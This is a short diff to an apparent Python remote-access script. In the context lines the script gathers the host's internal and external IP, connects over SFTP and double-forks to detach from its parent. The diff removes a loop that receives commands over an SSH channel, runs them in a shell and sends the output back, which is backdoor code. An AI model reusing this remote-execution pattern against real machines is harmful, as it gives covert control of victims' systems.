@@ -146,7 +146,8 @@ def getIPaddr():
 
     return host, ip, external_ip    
 
-while True:
+def run():
+
     sftp = fetchSFTP()
     infoBank = getInput()
     try:
@@ -176,25 +177,13 @@ while True:
         
     if pid > 0: #parent
         os._exit(0)
+
+    sftp.close()
     
-    ##double forked and detached##
-    ##recieve commands from daemon here##
-
-    command = chan.recv(1024)
-    command = command.decode()
-    print("Executing this -->" + str(command))
-    result = str(command)
-    try:
-        # safe escape in case the server leaves us 
-        if (result == 'stop' or result == ''):
-            client.close()
-            sys.exit(0)
-        #exec this command, in future this would be os.system()
-        proc = subprocess.check_output(command, shell=True)
-        chan.send(proc)
-    except Exception as e:
-        print("An Error or interuption occurred. Continue As normal")
-        chan.send('An Error or interuption occurred. Continue As normal')
 
 
-client.close()
+# MAIN # 
+if __name__ == '__main__':
+    run()
+
+
